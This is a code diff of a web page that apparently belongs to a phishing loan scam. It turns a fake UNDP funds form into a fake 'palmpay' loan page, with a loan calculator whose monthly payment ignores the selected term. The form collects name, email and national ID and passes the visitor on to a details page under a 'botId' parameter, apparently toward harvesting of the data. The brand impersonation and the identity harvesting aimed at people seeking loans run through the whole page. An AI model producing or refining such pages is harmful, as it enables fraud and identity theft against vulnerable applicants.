@@ -1,101 +1,298 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>UNDP Application Form</title>
+<title>palmpay Loan Application</title>
 
 <style>
-body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-.loan-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-h2 { text-align: center; margin-bottom: 20px; }
-label { display: block; margin: 10px 0 5px; font-weight: bold; }
-input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; margin-bottom: 15px; }
-button { width: 100%; padding: 12px; background: darkblue; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
-.logo-container { width: 100%;
-      height: 120px;
-       margin-bottom: 20px;
-       background-color: darkblue;
-       color: white;
-       text-align: center;
-      padding-top: 20px; }
-.logo { width: 100%; height: 100%;
-    background-color: blue;
-    color: white;
-     object-fit: cover; }
-.loan-notice { background: #fff3cd;
-   border: 1px solid #ffeeba; 
-   padding: 12px;
-    border-radius: 6px; 
-    font-size: 14px;
-    margin-bottom: 20px;
- }
-.loan-notice ol {
-    padding-left: 20px; /* indent numbers */
-    margin: 8px 0 0 0;
+body{
+    font-family: Arial, sans-serif;
+    background:#f6f4fb;
+    display:flex;
+    justify-content:center;
+    align-items:flex-start;
+    min-height:100vh;
+    margin:0;
+    padding:20px;
 }
-.loan-notice li {
-    margin-bottom: 6px;
+
+.loan-container{
+    background:#fff;
+    padding:25px;
+    border-radius:20px;
+    width:100%;
+    max-width:430px;
+    box-shadow:0 5px 15px rgba(0,0,0,0.1);
+}
+
+.logo-container{
+    background:#6a0dad;
+    color:white;
+    padding:20px;
+    border-radius:16px;
+    text-align:center;
+    margin-bottom:20px;
+}
+
+.logo-container h1{
+    margin:0;
+    font-size:28px;
+}
+
+.logo-container p{
+    margin-top:8px;
+    font-size:15px;
+}
+
+.calculator-box{
+    background:#f3ebff;
+    padding:20px;
+    border-radius:18px;
+    margin-bottom:20px;
+}
+
+.calculator-box h2{
+    color:#6a0dad;
+    margin-top:0;
+}
+
+.loan-amount{
+    font-size:34px;
+    font-weight:bold;
+    color:#6a0dad;
+    margin:10px 0;
+}
+
+.slider{
+    width:100%;
+    accent-color:#6a0dad;
+}
+
+.range-values{
+    display:flex;
+    justify-content:space-between;
+    font-size:13px;
+    color:#777;
+    margin-top:8px;
+}
+
+.term-buttons{
+    display:grid;
+    grid-template-columns:repeat(3,1fr);
+    gap:10px;
+    margin-top:15px;
+}
+
+.term-btn{
+    border:none;
+    padding:12px;
+    border-radius:12px;
+    background:#e7d8ff;
+    color:#6a0dad;
+    font-weight:bold;
+}
+
+.term-btn.active{
+    background:#6a0dad;
+    color:white;
+}
+
+.payment-box{
+    background:#ede3ff;
+    padding:18px;
+    border-radius:16px;
+    text-align:center;
+    margin-top:20px;
+}
+
+.payment-box h2{
+    color:#6a0dad;
+    margin:0;
+}
+
+.apply-btn{
+    width:100%;
+    padding:14px;
+    background:#6a0dad;
+    color:white;
+    border:none;
+    border-radius:12px;
+    font-size:17px;
+    margin-top:20px;
+    cursor:pointer;
+}
+
+.form-section{
+    display:none;
+}
+
+label{
+    display:block;
+    margin:10px 0 5px;
+    font-weight:bold;
+}
+
+input, select{
+    width:100%;
+    padding:12px;
+    border-radius:8px;
+    border:1px solid #ccc;
+    margin-bottom:15px;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    background:#6a0dad;
+    color:white;
+    border:none;
+    border-radius:10px;
+    font-size:16px;
+    cursor:pointer;
+}
+
+.loan-notice{
+    background:#f4ecff;
+    border:1px solid #d7bfff;
+    padding:14px;
+    border-radius:10px;
+    font-size:14px;
+    margin-bottom:20px;
+}
+
+.loan-notice ol{
+    padding-left:20px;
+}
+
+.loan-notice li{
+    margin-bottom:6px;
 }
 </style>
 </head>
+
 <body>
 
 <div class="loan-container">
+
     <div class="logo-container">
-     <h1>United Nations Development Program</h1>   
+        <h1>Palmpay loan application</h1>
+        <p>Fast & Secure & easy Loan Services</p>
     </div>
 
-    <form id="loanForm">
-        <!-- NEW NAME INPUT -->
-        <label>Full Name</label>
-        <input id="fullName" type="text" required placeholder="Enter your full name">
+    <!-- LOAN CALCULATOR -->
+    <div id="calculatorSection">
 
-        <label>Promotion Amount (USD)</label>
-        <input id="loanAmount" type="number" required placeholder="MIN50">
-        <label>Email</label>
-        <input id="email" type="email" placeholder="example@gmail.com" required>
-        <label>National ID</label>
-        <input id="nationalId" type="text"  placeholder="National Id">
-        <!-- <label>Repayment Period</label>
-        <select id="repaymentPeriod" required>
-            <option value="">Select</option>
-            <option value="7days">7 Days(1.5% interest)</option>
-            <option value="14days">14 Days(2.5% interest)</option>
-            <option value="21days">21 Days(3.5% interest)</option>
-            <option value="30days">30 Days(4.5% interest)</option>
-            <option value="60days">60 Days(6% interest)</option>
-            <option value="90days">90 Days(10% interest)</option>
-        </select> -->
-        <label>Employment Status</label>
-        <select id="employmentStatus" required>
-            <option value="">Select</option>
-            <option value="employed">Employed</option>
-            <option value="self-employed">Self-employed</option>
-            <option value="unemployed">Unemployed</option>
-            <option value="student">Student</option>
-        </select>
-        <label>Funds Purpose</label>
-        <select id="loanPurpose" required>
-            <option value="">Select</option>
-            <option value="business">Business</option>
-            <option value="personal">Personal Loans</option>
-            <option value="schoolfees">School Fees</option>
-            <option value="medical">Medical</option>
-            <option value="others">Others</option>
-        </select>
+        <div class="calculator-box">
 
-        <div class="loan-notice">
-            <strong>Qualification Notice:</strong>
-            <ol>
-                 <li>Must apply with a active Ecocash account.</li>
-                <li>Must have at least 10% of the amount applying in the Ecocash account </li>
-            </ol>
+            <h2>Loan Calculator</h2>
+
+            <p>Loan Amount</p>
+            <div class="loan-amount" id="amountDisplay">USD 15,400</div>
+
+            <input type="range" min="100" max="100000" value="15400" class="slider" id="loanSlider">
+
+            <div class="range-values">
+                <span>USD 100</span>
+                <span>USD 100,000</span>
+            </div>
+
+            <h3 style="color:#6a0dad;">Loan Term</h3>
+
+            <div class="term-buttons">
+                <button type="button" class="term-btn">6 months</button>
+                <button type="button" class="term-btn active">12 months</button>
+                <button type="button" class="term-btn">24 months</button>
+                <button type="button" class="term-btn">36 months</button>
+                <button type="button" class="term-btn">48 months</button>
+                <button type="button" class="term-btn">60 months</button>
+            </div>
+
+            <div class="payment-box">
+                <p>Estimated Monthly Payment</p>
+                <h2 id="monthlyPayment">USD 1,314.83</h2>
+            </div>
+
+            <button class="apply-btn" onclick="showForm()">Apply Now</button>
+
         </div>
 
-        <button type="submit">Next</button>
-    </form>
+    </div>
+
+    <!-- APPLICATION FORM -->
+    <div class="form-section" id="formSection">
+
+        <form id="loanForm">
+
+            <label>Full Name</label>
+            <input id="fullName" type="text" required placeholder="Enter your full name">
+
+            <label>Loan Amount (USD)</label>
+            <input id="loanAmount" type="number" required placeholder="Minimum 50">
+
+            <label>Email Address</label>
+            <input id="email" type="email" placeholder="example@gmail.com" required>
+
+            <label>National ID Number</label>
+            <input id="nationalId" type="text" placeholder="Enter National ID">
+
+            <label>Employment Status</label>
+            <select id="employmentStatus" required>
+                <option value="">Select</option>
+                <option value="employed">Employed</option>
+                <option value="self-employed">Self-employed</option>
+                <option value="unemployed">Unemployed</option>
+                <option value="student">Student</option>
+            </select>
+
+            <label>Purpose of Loan</label>
+            <select id="loanPurpose" required>
+                <option value="">Select</option>
+                <option value="business">Business</option>
+                <option value="personal">Personal Expenses</option>
+                <option value="schoolfees">School Fees</option>
+                <option value="medical">Medical Bills</option>
+                <option value="others">Others</option>
+            </select>
+
+            <div class="loan-notice">
+                <strong>Loan Application Notice:</strong>
+                <ol>
+                    <li>Ensure all information provided is correct.</li>
+                    <li>Approval depends on eligibility review.</li>
+                    <li>Loan terms and repayment conditions apply.</li>
+                </ol>
+            </div>
+
+            <button type="submit">Continue Application</button>
+
+        </form>
+
+    </div>
+
 </div>
+
+<script>
+function showForm(){
+    document.getElementById('calculatorSection').style.display='none';
+    document.getElementById('formSection').style.display='block';
+}
+
+const slider=document.getElementById('loanSlider');
+const amountDisplay=document.getElementById('amountDisplay');
+const monthlyPayment=document.getElementById('monthlyPayment');
+
+slider.addEventListener('input',()=>{
+    const amount=parseInt(slider.value);
+
+    amountDisplay.innerText='USD ' + amount.toLocaleString();
+
+    const payment=(amount/12).toFixed(2);
+
+    monthlyPayment.innerText='USD ' + payment;
+});
+</script>
 
 <script>
 // ✅ BOT ID FIX
@@ -113,16 +310,17 @@ document.getElementById('loanForm').addEventListener('submit', e => {
     e.preventDefault();
 
     // SAVE NAME + EXISTING FIELDS
-    localStorage.setItem('fullName', fullName.value); // NEW
+    localStorage.setItem('fullName', fullName.value);
     localStorage.setItem('loanAmount', loanAmount.value);
     localStorage.setItem('email', email.value);
     localStorage.setItem('nationalId', nationalId.value);
-    // localStorage.setItem('repaymentPeriod', repaymentPeriod.value);
     localStorage.setItem('employmentStatus', employmentStatus.value);
     localStorage.setItem('loanPurpose', loanPurpose.value);
 
     window.location.href = `details.html?botId=${botId}`;
 });
 </script>
+
 </body>
 </html>
+
